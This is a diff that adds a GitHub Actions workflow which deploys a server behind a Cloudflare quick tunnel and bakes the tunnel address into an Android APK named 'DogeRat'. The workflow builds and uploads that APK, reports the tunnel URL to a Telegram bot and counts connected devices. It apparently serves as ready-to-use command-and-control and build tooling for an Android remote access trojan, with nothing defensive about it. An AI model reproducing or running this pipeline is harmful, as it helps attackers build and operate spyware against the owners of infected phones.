@@ -1,0 +1,417 @@
+name: Deploy Server & Build APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: "Server runtime (minutes)"
+        required: true
+        default: "30"
+        type: choice
+        options: ["5", "10", "15", "30", "60"]
+      build_type:
+        description: "APK build type"
+        required: true
+        default: "debug"
+        type: choice
+        options: ["debug", "release", "both"]
+      use_custom_host_socket:
+        description: "Use custom Host & Socket URL"
+        required: true
+        default: false
+        type: boolean
+      custom_host_url:
+        description: "Custom Host URL (e.g., https://your-server.com/)"
+        required: false
+        default: ""
+        type: string
+      custom_socket_url:
+        description: "Custom Socket URL (e.g., wss://your-server.com/)"
+        required: false
+        default: ""
+        type: string
+      use_custom_webview:
+        description: "Use custom WebView URL"
+        required: true
+        default: false
+        type: boolean
+      custom_webview_url:
+        description: "Custom WebView URL (e.g., https://your-site.com/)"
+        required: false
+        default: ""
+        type: string
+
+env:
+  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+  TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+
+jobs:
+  deploy-and-build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 90
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Get version from build.gradle
+        id: version
+        run: |
+          VERSION_NAME=$(grep "versionName" ./app/app/build.gradle | sed 's/.*versionName "//' | sed 's/".*//')
+          VERSION_CODE=$(grep "versionCode" ./app/app/build.gradle | sed 's/.*versionCode //')
+          echo "version_name=$VERSION_NAME" >> $GITHUB_OUTPUT
+          echo "version_code=$VERSION_CODE" >> $GITHUB_OUTPUT
+          echo "Detected version: $VERSION_NAME (code: $VERSION_CODE)"
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install server dependencies
+        working-directory: ./server
+        run: npm install
+
+      - name: Create .env file for server
+        working-directory: ./server
+        run: |
+          echo "TELEGRAM_BOT_TOKEN=${{ env.TELEGRAM_BOT_TOKEN }}" > .env
+          echo "TELEGRAM_CHAT_ID=${{ env.TELEGRAM_CHAT_ID }}" >> .env
+          echo "PORT=8999" >> .env
+
+      - name: Start server in background
+        working-directory: ./server
+        run: |
+          nohup npm start > /tmp/server.log 2>&1 &
+          echo "Server started, waiting for it to be ready..."
+
+          for i in {1..30}; do
+            if curl -s http://localhost:8999/ > /dev/null 2>&1; then
+              echo "Server is responding on port 8999"
+              break
+            fi
+            echo "Waiting for server... ($i/30)"
+            sleep 2
+          done
+
+          echo "=== Server Log ==="
+          cat /tmp/server.log
+
+      - name: Setup Cloudflare tunnel
+        id: tunnel
+        run: |
+          curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+          sudo dpkg -i cloudflared.deb
+
+          echo "Starting Cloudflare tunnel..."
+
+          nohup cloudflared tunnel --url http://localhost:8999 > /tmp/tunnel.log 2>&1 &
+
+          echo "Waiting for tunnel URL..."
+
+          TUNNEL_URL=""
+          for i in {1..60}; do
+            sleep 2
+            if [ -f /tmp/tunnel.log ]; then
+              TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' /tmp/tunnel.log | head -1 || true)
+              if [ -n "$TUNNEL_URL" ]; then
+                echo "Found tunnel URL: $TUNNEL_URL"
+                break
+              fi
+            fi
+            echo "Waiting for tunnel... ($i/60)"
+          done
+
+          if [ -z "$TUNNEL_URL" ]; then
+            echo "ERROR: Could not get tunnel URL"
+            echo "=== Tunnel Log ==="
+            cat /tmp/tunnel.log || echo "No log file"
+            exit 1
+          fi
+
+          echo "tunnel_url=$TUNNEL_URL" >> $GITHUB_OUTPUT
+          echo "TUNNEL_URL=$TUNNEL_URL" >> $GITHUB_ENV
+
+          echo "Testing tunnel connectivity..."
+          sleep 5
+          curl -s "$TUNNEL_URL/" || echo "Tunnel test returned non-zero exit code"
+
+          echo "=== Tunnel Log (last 20 lines) ==="
+          tail -20 /tmp/tunnel.log
+
+      - name: Configure AppTools.kt
+        run: |
+          TUNNEL_URL="${{ steps.tunnel.outputs.tunnel_url }}"
+          USE_CUSTOM_HOST_SOCKET="${{ github.event.inputs.use_custom_host_socket }}"
+          USE_CUSTOM_WEBVIEW="${{ github.event.inputs.use_custom_webview }}"
+          CUSTOM_HOST="${{ github.event.inputs.custom_host_url }}"
+          CUSTOM_SOCKET="${{ github.event.inputs.custom_socket_url }}"
+          CUSTOM_WEBVIEW="${{ github.event.inputs.custom_webview_url }}"
+
+          echo "=== Configuration Options ==="
+          echo "Use Custom Host & Socket: $USE_CUSTOM_HOST_SOCKET"
+          echo "Use Custom WebView: $USE_CUSTOM_WEBVIEW"
+          echo "============================"
+
+          # Determine Host & Socket URLs
+          if [ "$USE_CUSTOM_HOST_SOCKET" = "true" ]; then
+            HOST_URL="$CUSTOM_HOST"
+            SOCKET_URL="$CUSTOM_SOCKET"
+            echo "Using custom Host: $HOST_URL"
+            echo "Using custom Socket: $SOCKET_URL"
+          else
+            HOST_URL="${TUNNEL_URL}/"
+            SOCKET_URL="${TUNNEL_URL/https:/wss:}/"
+            echo "Using tunnel Host: $HOST_URL"
+            echo "Using tunnel Socket: $SOCKET_URL"
+          fi
+
+          # Determine WebView URL
+          if [ "$USE_CUSTOM_WEBVIEW" = "true" ]; then
+            WEBVIEW_URL="$CUSTOM_WEBVIEW"
+            echo "Using custom WebView: $WEBVIEW_URL"
+          else
+            WEBVIEW_URL="https://www.google.com"
+            echo "Using default WebView: $WEBVIEW_URL"
+          fi
+
+          # Build JSON and encode to Base64
+          JSON_STRING="{\"host\":\"$HOST_URL\",\"socket\":\"$SOCKET_URL\",\"webView\":\"$WEBVIEW_URL\"}"
+          echo "JSON Config: $JSON_STRING"
+
+          BASE64_DATA=$(echo -n "$JSON_STRING" | base64 -w 0)
+          echo "Base64 Encoded: $BASE64_DATA"
+
+          APP_TOOLS_FILE="./app/app/src/main/java/willi/fiend/Utils/AppTools.kt"
+
+          if [ -f "$APP_TOOLS_FILE" ]; then
+            sed -i "s|private const val DEFAULT_DATA = \"\"|private const val DEFAULT_DATA = \"$BASE64_DATA\"|" "$APP_TOOLS_FILE"
+
+            echo "=== Updated AppTools.kt ==="
+            grep -A 3 "DEFAULT_DATA" "$APP_TOOLS_FILE"
+
+            if grep -q "$BASE64_DATA" "$APP_TOOLS_FILE"; then
+              echo "SUCCESS: DEFAULT_DATA was replaced correctly"
+            else
+              echo "ERROR: DEFAULT_DATA replacement may have failed"
+              head -40 "$APP_TOOLS_FILE"
+              exit 1
+            fi
+          else
+            echo "ERROR: AppTools.kt not found at $APP_TOOLS_FILE"
+            exit 1
+          fi
+
+      - name: Setup Java 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.2'
+
+      - name: Grant execute permission for gradlew
+        working-directory: ./app
+        run: chmod +x gradlew
+
+      - name: Build APK
+        id: build
+        working-directory: ./app
+        run: |
+          BUILD_TYPE="${{ github.event.inputs.build_type }}"
+          echo "Building APK type: $BUILD_TYPE"
+
+          if [ "$BUILD_TYPE" = "debug" ]; then
+            echo "Building Debug APK..."
+            ./gradlew assembleDebug --no-daemon --stacktrace
+          elif [ "$BUILD_TYPE" = "release" ]; then
+            echo "Building Release APK..."
+            ./gradlew assembleRelease --no-daemon --stacktrace
+          else
+            echo "Building both Debug and Release APK..."
+            ./gradlew assembleDebug assembleRelease --no-daemon --stacktrace
+          fi
+
+          echo "Build complete!"
+
+      - name: Prepare APK files
+        id: apk
+        run: |
+          VERSION="${{ steps.version.outputs.version_name }}"
+          BUILD_TYPE="${{ github.event.inputs.build_type }}"
+          TUNNEL_URL="${{ steps.tunnel.outputs.tunnel_url }}"
+          TUNNEL_ID=$(echo "$TUNNEL_URL" | sed 's/https:\/\///' | cut -d'.' -f1)
+
+          mkdir -p ./apk_output
+
+          # Handle debug APK
+          if [ "$BUILD_TYPE" = "debug" ] || [ "$BUILD_TYPE" = "both" ]; then
+            DEBUG_APK=$(find ./app/app/build/outputs/apk/debug -name "*.apk" 2>/dev/null | head -1 || true)
+            if [ -n "$DEBUG_APK" ]; then
+              DEBUG_NAME="DogeRat-v${VERSION}-debug-${TUNNEL_ID}.apk"
+              cp "$DEBUG_APK" "./apk_output/$DEBUG_NAME"
+              echo "Debug APK: $DEBUG_NAME"
+              echo "debug_apk=$DEBUG_NAME" >> $GITHUB_OUTPUT
+            fi
+          fi
+
+          # Handle release APK
+          if [ "$BUILD_TYPE" = "release" ] || [ "$BUILD_TYPE" = "both" ]; then
+            RELEASE_APK=$(find ./app/app/build/outputs/apk/release -name "*.apk" 2>/dev/null | head -1 || true)
+            if [ -n "$RELEASE_APK" ]; then
+              RELEASE_NAME="DogeRat-v${VERSION}-release-${TUNNEL_ID}.apk"
+              cp "$RELEASE_APK" "./apk_output/$RELEASE_NAME"
+              echo "Release APK: $RELEASE_NAME"
+              echo "release_apk=$RELEASE_NAME" >> $GITHUB_OUTPUT
+            fi
+          fi
+
+          # List all APK files
+          echo "=== APK Files ==="
+          ls -la ./apk_output/
+
+      - name: Upload Debug APK
+        if: github.event.inputs.build_type == 'debug' || github.event.inputs.build_type == 'both'
+        uses: actions/upload-artifact@v4
+        with:
+          name: DogeRat-v${{ steps.version.outputs.version_name }}-debug
+          path: ./apk_output/DogeRat-v${{ steps.version.outputs.version_name }}-debug-*.apk
+          retention-days: 7
+          if-no-files-found: error
+
+      - name: Upload Release APK
+        if: github.event.inputs.build_type == 'release' || github.event.inputs.build_type == 'both'
+        uses: actions/upload-artifact@v4
+        with:
+          name: DogeRat-v${{ steps.version.outputs.version_name }}-release
+          path: ./apk_output/DogeRat-v${{ steps.version.outputs.version_name }}-release-*.apk
+          retention-days: 7
+          if-no-files-found: error
+
+      - name: Send Telegram notification
+        if: env.TELEGRAM_CHAT_ID != ''
+        run: |
+          VERSION="${{ steps.version.outputs.version_name }}"
+          TUNNEL_URL="${{ steps.tunnel.outputs.tunnel_url }}"
+          DURATION="${{ github.event.inputs.duration }}"
+          BUILD_TYPE="${{ github.event.inputs.build_type }}"
+          USE_CUSTOM_HOST_SOCKET="${{ github.event.inputs.use_custom_host_socket }}"
+          USE_CUSTOM_WEBVIEW="${{ github.event.inputs.use_custom_webview }}"
+          END_TIME=$(date -d "+$DURATION minutes" '+%H:%M UTC')
+
+          CONFIG_STATUS=""
+          if [ "$USE_CUSTOM_HOST_SOCKET" = "true" ]; then
+            CONFIG_STATUS="${CONFIG_STATUS}✅ Host & Socket: Custom%0A"
+          else
+            CONFIG_STATUS="${CONFIG_STATUS}✅ Host & Socket: Tunnel URL%0A"
+          fi
+
+          if [ "$USE_CUSTOM_WEBVIEW" = "true" ]; then
+            CONFIG_STATUS="${CONFIG_STATUS}✅ WebView: Custom%0A"
+          else
+            CONFIG_STATUS="${CONFIG_STATUS}✅ WebView: Default (Google)%0A"
+          fi
+
+          MESSAGE="🚀 DogeRat v${VERSION} Server is ONLINE!%0A%0A📱 Build: $BUILD_TYPE%0A🌐 Tunnel: $TUNNEL_URL%0A⏱️ Duration: $DURATION minutes%0A🕐 Ends at: $END_TIME%0A%0A⚙️ Configuration:%0A${CONFIG_STATUS}%0A📥 Download APK from GitHub Actions Artifacts."
+
+          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
+            -d "text=$MESSAGE" || echo "Telegram notification failed"
+
+      - name: Job Summary
+        run: |
+          VERSION="${{ steps.version.outputs.version_name }}"
+          TUNNEL_URL="${{ steps.tunnel.outputs.tunnel_url }}"
+          DURATION="${{ github.event.inputs.duration }}"
+          BUILD_TYPE="${{ github.event.inputs.build_type }}"
+          USE_CUSTOM_HOST_SOCKET="${{ github.event.inputs.use_custom_host_socket }}"
+          USE_CUSTOM_WEBVIEW="${{ github.event.inputs.use_custom_webview }}"
+          CUSTOM_HOST="${{ github.event.inputs.custom_host_url }}"
+          CUSTOM_SOCKET="${{ github.event.inputs.custom_socket_url }}"
+          CUSTOM_WEBVIEW="${{ github.event.inputs.custom_webview_url }}"
+          END_TIME=$(date -d "+$DURATION minutes" '+%Y-%m-%d %H:%M:%S UTC')
+
+          echo "## 🚀 Deployment Summary" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "### Build Configuration" >> $GITHUB_STEP_SUMMARY
+          echo "- **Build Type:** $BUILD_TYPE" >> $GITHUB_STEP_SUMMARY
+          echo "- **Version:** $VERSION" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "### URL Configuration" >> $GITHUB_STEP_SUMMARY
+          if [ "$USE_CUSTOM_HOST_SOCKET" = "true" ]; then
+            echo "- **Host URL:** \`$CUSTOM_HOST\` (custom)" >> $GITHUB_STEP_SUMMARY
+            echo "- **Socket URL:** \`$CUSTOM_SOCKET\` (custom)" >> $GITHUB_STEP_SUMMARY
+          else
+            echo "- **Host URL:** \`${TUNNEL_URL}/\` (tunnel)" >> $GITHUB_STEP_SUMMARY
+            echo "- **Socket URL:** \`${TUNNEL_URL/https:/wss:}/\` (tunnel)" >> $GITHUB_STEP_SUMMARY
+          fi
+          if [ "$USE_CUSTOM_WEBVIEW" = "true" ]; then
+            echo "- **WebView URL:** \`$CUSTOM_WEBVIEW\` (custom)" >> $GITHUB_STEP_SUMMARY
+          else
+            echo "- **WebView URL:** \`https://www.google.com\` (default)" >> $GITHUB_STEP_SUMMARY
+          fi
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "### ⏱️ Server Runtime" >> $GITHUB_STEP_SUMMARY
+          echo "- **Duration:** $DURATION minutes" >> $GITHUB_STEP_SUMMARY
+          echo "- **Ends at:** $END_TIME" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "### 📥 Download" >> $GITHUB_STEP_SUMMARY
+          echo "Download APK(s) from the **Artifacts** section below." >> $GITHUB_STEP_SUMMARY
+
+      - name: Keep server running
+        run: |
+          DURATION="${{ github.event.inputs.duration }}"
+          TUNNEL_URL="${{ steps.tunnel.outputs.tunnel_url }}"
+
+          echo "=========================================="
+          echo "🚀 Server is RUNNING for $DURATION minutes"
+          echo "🌐 Tunnel URL: $TUNNEL_URL"
+          echo "=========================================="
+          echo ""
+          echo "Install the APK and test your bot!"
+          echo "The server will remain active during this time."
+          echo ""
+
+          TOTAL_SECONDS=$((DURATION * 60))
+          ELAPSED=0
+
+          while [ $ELAPSED -lt $TOTAL_SECONDS ]; do
+            REMAINING=$((TOTAL_SECONDS - ELAPSED))
+            REMAINING_MINS=$((REMAINING / 60))
+            REMAINING_SECS=$((REMAINING % 60))
+
+            SERVER_OK=$(curl -s http://localhost:8999/ > /dev/null 2>&1 && echo "OK" || echo "FAIL")
+            TUNNEL_OK=$(curl -s "$TUNNEL_URL/" > /dev/null 2>&1 && echo "OK" || echo "FAIL")
+
+            DEVICES=$(curl -s http://localhost:8999/status 2>/dev/null | jq -r '.connectedDevices // 0' 2>/dev/null || echo "0")
+
+            echo "⏱️ Time remaining: ${REMAINING_MINS}m ${REMAINING_SECS}s | Server: $SERVER_OK | Tunnel: $TUNNEL_OK | Devices: $DEVICES"
+
+            sleep 60
+            ELAPSED=$((ELAPSED + 60))
+          done
+
+          echo ""
+          echo "=========================================="
+          echo "⏰ Server runtime completed ($DURATION minutes)"
+          echo "=========================================="
+
+      - name: Send end notification
+        if: env.TELEGRAM_CHAT_ID != ''
+        run: |
+          VERSION="${{ steps.version.outputs.version_name }}"
+          MESSAGE="⏰ DogeRat v${VERSION} Server runtime ended!%0A%0AThe server tunnel has been closed.%0ARe-run the workflow if you need more time."
+
+          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
+            -d "text=$MESSAGE" || echo "Telegram notification failed"
+
+      - name: Cleanup
+        if: always()
+        run: |
+          pkill -f "node server.js" || true
+          pkill -f cloudflared || true
+          echo "Cleanup completed"
